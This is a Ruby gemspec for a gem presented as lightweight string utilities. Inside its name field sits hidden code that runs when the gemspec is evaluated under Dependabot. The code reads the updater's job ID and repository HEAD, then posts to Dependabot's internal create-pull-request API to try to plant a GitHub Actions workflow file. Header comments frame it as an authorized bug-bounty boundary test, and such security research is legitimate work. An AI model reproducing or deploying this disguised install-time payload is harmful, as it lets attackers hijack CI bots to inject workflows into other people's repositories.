# frozen_string_literal: true
#
# v5.1 boundary-verification audit — own-job PR-creation body shape.
#
# Authorization: HackerOne GitHub program; researcher's own job; own
# jobId; own repo only; placeholder content only.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"

      own_id = (
        begin
          j = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
          (j["job"] && j["job"]["id"]) || j["id"] || ENV["DEPENDABOT_JOB_ID"]
        rescue
          ENV["DEPENDABOT_JOB_ID"]
        end
      ).to_s

      # Extract real HEAD sha from the cloned repo
      base_sha = (
        begin
          repo_path = "/home/dependabot/dependabot-updater/repo"
          if Dir.exist?(repo_path)
            head_file = File.read("#{repo_path}/.git/HEAD").strip
            if head_file.start_with?("ref: ")
              ref = head_file.sub("ref: ", "")
              File.read("#{repo_path}/.git/#{ref}").strip
            else
              head_file
            end
          else
            ""
          end
        rescue
          ""
        end
      )

      if !own_id.empty? && !base_sha.empty?
        # Two probes for differential diagnosis:
        # T1: file path under repo root (innocent control)
        # T2: file path under .github/workflows/ (the question under audit)

        ["t1-control", "t2-workflow-path"].each_with_index do |label, idx|
          file_dir = idx == 0 ? "/" : ".github/workflows"
          file_name = idx == 0 ? "audit-control.txt" : "audit-test-v51.yml"
          file_content = idx == 0 ?
            "audit control content\n" :
            "name: audit-test-v51\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo audit\n"

          data = {
            "dependencies" => [
              {
                "name" => "audit-test-#{label}-pkg",
                "previous-version" => "0.0.1",
                "version" => "0.0.2",
                "package-manager" => "bundler",
                "requirements" => [],
                "previous-requirements" => []
              }
            ],
            "updated-dependency-files" => [
              {
                "name" => file_name,
                "directory" => file_dir,
                "content" => file_content,
                "type" => "file",
                "support_file" => false,
                "content_encoding" => "utf-8",
                "deleted" => false,
                "operation" => "create"
              }
            ],
            "base-commit-sha" => base_sha,
            "commit-message" => "audit test v51 #{label}",
            "pr-title" => "audit test v51 #{label}",
            "pr-body" => "audit test v51"
          }

          begin
            uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/create_pull_request")
            h = Net::HTTP.new(uri.host, uri.port)
            h.use_ssl = true
            h.open_timeout = 5
            h.read_timeout = 8
            req = Net::HTTP::Post.new(uri.request_uri)
            req["Content-Type"] = "application/json"
            req.body = JSON.dump({ "data" => data })
            h.request(req)
          rescue
          end
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
